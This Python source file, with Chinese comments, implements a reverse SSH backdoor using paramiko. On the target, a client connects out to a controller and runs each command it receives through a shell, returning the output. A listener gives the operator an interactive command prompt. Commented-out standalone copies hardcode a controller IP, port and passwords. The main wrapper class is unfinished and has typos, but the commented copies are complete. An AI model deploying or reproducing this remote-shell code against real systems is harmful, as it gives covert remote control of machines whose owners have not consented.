#!/usr/bin/env python3
# -*- coding-utf-8 -*-

# 待优化

import sys
import socket
import paramiko
import threading
import subprocess
from io import StringIO
import fire
from loguru import logger

class ReverseSSHClient(object):
    def __init__(self, ip = '127.0.0.1', port = 22, user = 'root', passwd = 'root', command = 'whoami'):
        self.ip = ip
        self.user = user
        self.passwd = passwd
        self.command = command
        self.port = port

    def reverse_ssh_client(ip, user, passwd, command, port):
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port = port, username = user, password = passwd, timeout = 5, compress = True)
        ssh_session = client.get_transport().open_session()
        if ssh_session.active:
            ssh_session.send(command)
            print(ssh_session.recv(1024))
            while True:
                command = ssh_session.recv(1024)
                try: # 等待服务器的命令，执行命令，且发送结果给服务端
                    cmd_output = subprocess.check_output(command, shell = True)
                    ssh_session.send(cmd_output)
                except OSError:
                    break
                except Exception as e:
                    ssh_session.send('命令错误')
                client.close()
            return
    def main(self):
        # '202.100.1.224', 'qytanguser', 'qytanggccies', 'ClientConnected', 6868
        self.reverse_ssh_client(self.ip, self.user, self.passwd, self.command, self.port)

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PAROHIBITED
    
    def check_auth_password(self, username, password):
        if (username == 'qytanguser') and (password == 'qytangccies'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

class ReverseSSHServer(object):
    def __init__(self, ip = '127.0.0.1', port = 22, passwd = 'root'):
        self.ip = ip
        self.port = port
        # self.user = user
        self.passwd = passwd
        self.host_key = paramiko.RSAKey.from_private_key_file(filename = 'id_rsa.key', password = passwd)

    def reverse_ssh_server(self, ip, port):
        # '202.100.1.224', 6868, 'cisco', 'cisco123'
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((ip, port))
            sock.listen(100)
            print("[+] Listening for connection ...")
            client, addr = sock.accept()
        except Exception as e:
            print("[-] Listen Failed: " + str(e))
            sys.exit(1)
        print("[+] Got a connection")

        try:
            bhSession = paramiko.Transport(client)
            bhSession.add_server_key(self.host_key)
            server = Server()

            try:
                bhSession.connect(server = server)
            except paramiko.SSHException as x:
                print("[-] SSH Negotiation failed.")
            chan = bhSession.accept(20)
            print("[+] Authenticated!")
            print(chan.recv(1024))
            chan.send("Welcome to bh_ssh")
            while True:
                try:
                    command = input("Enter command: ").strip('\n')
                    if command != 'exit':
                        chan.send(command.encode())
                        print(chan.recv(1024).decode())
                    else:
                        chan.send('exit')
                        print("exiting")
                        bhSession.close()
                        raise Exception('exit')
                except KeyboardInterrupt:
                        bhSession.close()
        except Exception as e:
            print("[-] Caught exception:" + str(e))
            try:
                bhSession.close()
            except:
                pass
            sys.exit(1)

class ReverseSSH(object):
    """
    反向SSH 时，Client 为目标服务端，Server 为外网服务端
    """
    def __init__(self, ip = '127.0.0.1', port = 22, passwd = 'root', command = 'whoami'):
        self.ip = ip
        self.port = port
        self.passwd = passwd
        self.command = command
        self.thread = threading.Thread(target = self.reverse_ssh)
        self.thread.start()
    
    def reverse_ssh(self):
        ssh_cliet = ReverseSSHClient
        ssh_server = ReverseSSHServer

if __name__ == '__main__':
    fire.Fire(ReverseSSH)

'''
# reverse ssh client

import paramiko
import threading
import subprocess
from io import StringIO

def ssh_command(ip, user, passwd, command, port):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port = port, username = user, password = passwd, timeout = 5, compress = True)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try: # 等待服务器的命令，执行命令，且发送结果给服务端
                cmd_output = subprocess.check_output(command, shell = True)
                ssh_session.send(cmd_output)
            except OSError:
                break
            except Exception as e:
                ssh_session.send('命令错误')
            client.close()
        return
    
if __name__ == '__main__':
    ssh_command('202.100.1.224', 'qytanguser', 'qytanggccies', 'ClientConnected', 6868)

'''

'''
# reverse ssh server

import sys
import socket
import paramiko
import threading

# server = sys.arv[1]
server = '202.100.1.224'
# ssh_port = int(sys.argv[2])
ssh_port = 6868

host_key = paramiko.RSAKey.from_private_key_file(filename = 'id_rsa.key', password = 'Cisco123')

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PAROHIBITED
    
    def check_auth_password(self, username, password):
        if (username == 'qytanguser') and (password == 'qytangccies'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    
def main():
    global server
    global ssh_port
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+] Listening for connection ...")
        client, addr = sock.accept()
    except Exception as e:
        print("[-] Listen Failed: " + str(e))
        sys.exit(1)
    print("[+] Got a connection")

    try:
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()

        try:
            bhSession.connect(server = server)
        except paramiko.SSHException as x:
            print("[-] SSH Negotiation failed.")
        chan = bhSession.accept(20)
        print("[+] Authenticated!")
        print(chan.recv(1024))
        chan.send("Welcome to bh_ssh")
        while True:
            try:
                command = input("Enter command: ").strip('\n')
                if command != 'exit':
                    chan.send(command.encode())
                    print(chan.recv(1024).decode())
                else:
                    chan.send('exit')
                    print("exiting")
                    bhSession.close()
                    raise Exception('exit')
            except KeyboardInterrupt:
                    bhSession.close()
    except Exception as e:
        print("[-] Caught exception:" + str(e))
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)

if __name__ == '__main__':
    main()

'''